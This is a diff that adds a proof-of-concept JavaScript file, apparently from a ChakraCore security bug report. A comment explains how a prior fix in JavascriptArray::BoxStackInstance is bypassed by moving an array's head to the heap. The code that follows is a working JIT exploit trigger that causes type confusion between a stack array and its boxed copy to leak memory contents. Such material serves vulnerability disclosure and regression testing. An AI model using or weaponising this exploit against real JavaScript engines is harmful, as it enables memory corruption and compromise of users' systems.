@@ -1,0 +1,73 @@
+/*
+Here's a snippet of JavascriptArray::BoxStackInstance. To fix  issue 1420 , "deepCopy" was introduced. But it only deep-copies the array when "instance->head" is on the stack. So simply by adding a single line of code that allocates "head" to the heap, we can bypass the fix.
+
+    template <typename T>
+    T * JavascriptArray::BoxStackInstance(T * instance, bool deepCopy)
+    {
+        Assert(ThreadContext::IsOnStack(instance));
+        // On the stack, the we reserved a pointer before the object as to store the boxed value
+        T ** boxedInstanceRef = ((T **)instance) - 1;
+        T * boxedInstance = *boxedInstanceRef;
+        if (boxedInstance)
+        {
+            return boxedInstance;
+        }
+
+        const size_t inlineSlotsSize = instance->GetTypeHandler()->GetInlineSlotsSize();
+        if (ThreadContext::IsOnStack(instance->head))
+        {
+            boxedInstance = RecyclerNewPlusZ(instance->GetRecycler(),
+                inlineSlotsSize + sizeof(Js::SparseArraySegmentBase) + instance->head->size * sizeof(typename T::TElement),
+                T, instance, true, deepCopy);
+        }
+        else if(inlineSlotsSize)
+        {
+            boxedInstance = RecyclerNewPlusZ(instance->GetRecycler(), inlineSlotsSize, T, instance, false, false);
+        }
+        else
+        {
+            boxedInstance = RecyclerNew(instance->GetRecycler(), T, instance, false, false);
+        }
+
+        *boxedInstanceRef = boxedInstance;
+        return boxedInstance;
+    }
+
+PoC:
+*/
+
+function inlinee() {
+    return inlinee.arguments[0];
+}
+
+function opt(convert_to_var_array) {
+    /*
+    To make the in-place type conversion happen, it requires to segment.
+    */
+
+    let stack_arr = [];
+
+    // Allocate stack_ar->head to the heap
+    stack_arr[20] = 1.1;
+
+    stack_arr[10000] = 1.1;
+    stack_arr[20000] = 2.2;
+
+    let heap_arr = inlinee(stack_arr);
+    convert_to_var_array(heap_arr);
+
+    stack_arr[10000] = 2.3023e-320;
+
+    return heap_arr[10000];
+}
+
+function main() {
+    for (let i = 0; i < 10000; i++)
+        opt(new Function(''));  // Prevents to be inlined
+
+    print(opt(heap_arr => {
+        heap_arr[10000] = {};  // ConvertToVarArray
+    }));
+}
+
+main();
